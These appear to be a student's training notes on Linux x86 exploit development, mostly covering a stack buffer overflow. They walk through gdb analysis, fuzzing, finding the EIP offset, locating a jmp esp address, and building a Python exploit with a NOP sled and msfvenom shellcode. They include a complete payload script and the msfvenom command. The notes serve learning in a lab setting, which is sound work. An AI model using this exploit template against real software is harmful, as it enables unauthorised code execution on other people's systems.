###EXpolit dev ###
#static analysis
strings <file>

#behav
chmod u+x <file>
./<file>

#dynamic 
./<file> $(echo "12345678")          #command substiution as parameter
./<file> <<<$(echo "12345678")       #simulates user input
fuzzing = see if you can break it wiht varying inputs i.e. AAAAAAAAAAA... as input 

#gdb
gdb ./<file>
info functions
disass main or pdisass main
disass or pdisass questionable functions
#red functions so vulnerablities
---------------------------------------------------------------
shell                                #take you to student-ops$ 
exit                                 #back to gdb from student-ops
quit                                 #exit gdb
info functions                       #lists functions (funcitons name <name>@plt)
disass main                          #opens main func
pdisass main                         #opens main but wiht colors
run                                  #runs functions
---------------------------------------------------------------
#go to script
#!/user/bin/env python 

#offset = "A" *100
#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" 
offset = "A" *62
#eip = "LLLL"
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xbb\xd6\x31\x7a\x55\xdb\xc7\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x0b\x31\x5a\x14\x03\x5a\x14\x83\xea"
buf += b"\xfc\x34\xc4\x10\x5e\xe0\xbe\xb7\x06\x78\xec\x54"
buf += b"\x4e\x9f\x86\xb5\x23\x37\x57\xa2\xec\xa5\x3e\x5c"
buf += b"\x7a\xca\x93\x48\x7b\x0c\x14\x89\xf3\x64\x7b\xe8"
buf += b"\x96\x1d\x83\xbd\x3b\x54\x62\x8c\x3c"
print(offset+eip+nop+buf)




run <<<$(python fuckup.py)
#go to wirepooint EIP
#copy EIP value into register value to find offset value
#change offset and make an eip variable

#shell > env - gdb ./func > unset env LINES > unset env COLUMNS > show env > run > ctrl+C > info proc map 
#first address after the heap and last address [stack]
#[heap] 0xf7de1000 and [stack] 0xf7ffe000
#find /b <first addr heap>, <last addr stack>, 0xff, 0xe4
#take the first 4 of the addrs that populate and copy them to your notes then split and convert to little endian as done below 
'''
0xf7|de|3b|59 -> "\x59\x3b\xde\xf7"
0xf7|f5|88|ab -> "\xab\x88\xf5\xf7"
0xf7|f6|45|fb -> "\xfb\x45\xf6\xf7"
0xf7|f6|46|0f -> "\x0f\x46\xf6\xf7"
'''
#edit eip with created values and add nopsled (add tp print) 
#create varable for buff (add to print)
#make payload
#msfvenom -p linux/x86/exec CMD=<whoami> -b '\x00\xfe\x20\x0a\xff' -f python 
                                             #bad bytes
#./<file> <<<$(python <script>)
